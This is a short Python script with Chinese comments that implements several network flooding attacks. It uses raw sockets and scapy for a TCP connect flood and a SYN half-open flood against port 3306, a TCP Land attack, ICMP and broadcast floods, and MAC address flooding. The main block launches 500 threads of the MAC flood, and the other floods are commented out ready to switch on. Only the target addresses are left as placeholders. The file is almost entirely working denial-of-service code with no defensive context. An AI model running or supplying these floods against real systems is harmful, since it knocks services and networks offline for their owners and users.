# 模拟各类泛洪攻击
import socket, random, time, os, threading

from scapy.layers.inet import IP, TCP, ICMP
from scapy.layers.l2 import Ether
from scapy.sendrecv import send, sendp
from scapy.volatile import RandMAC


# 1、使用socket三次握手泛洪
def socket_flood():
    while True:
        s = socket.socket()
        s.connect(('ipxxx', 3306))

# 2、使用scapy半连接泛洪
def scapy_flood():
    while True:
        sport = random.randint(10000, 30000)
        pkg = IP(dst='ipxxx')/TCP(sport=sport, dport=3306, flags='S')
        send(pkg, verbose=False)
# 3、使用TCP Land进行泛洪(源IP地址和目标IP地址是同一个)
def tcp_land():
    while True:
        sport = random.randint(10000, 30000)
        pkg = IP(src='ipxxx', dst='ipxxx')/TCP(sport=sport, dport=3306, flags='S')
        send(pkg, verbose=False)

# 4、ICMP泛洪
def icmp_flood():
    while True:
        payload = 'Hello'*100
        pkg = IP(dst='ipxxx')/ICMP()/payload*200
        send(pkg, verbose=False)

# 5、ICMP广播风暴泛洪
def icmp_broadcast():
    while True:
        payload = 'hello'*200
        pkg = IP(dst='ipxxx')/ICMP()/payload*200
        send(pkg, verbose=False)

# 6、MAC地址泛洪
def mac_flood():
    while True:
        randmac=RandMAC("*:*:*:*:*:*")
        print(randmac)
        srandip=f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1, 254)}.{random.randint(1,254)}"
        drandip=f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1, 254)}.{random.randint(1,254)}"
        print(srandip)
        packet=Ether(src=randmac, dst=randmac)/IP(src=srandip, dst=drandip)
        sendp(packet, iface='wlan0', loop=0)
if __name__ == '__main__':
    for i in range(500):
        # threading.Thread(target=socket_flood).start()
        # threading.Thread(target=scapy_flood).start()
        # threading.Thread(target=tcp_land).start()
        # threading.Thread(target=icmp_flood).start()
        # threading.Thread(target=icmp_broadcast).start()
        threading.Thread(target=mac_flood).start()
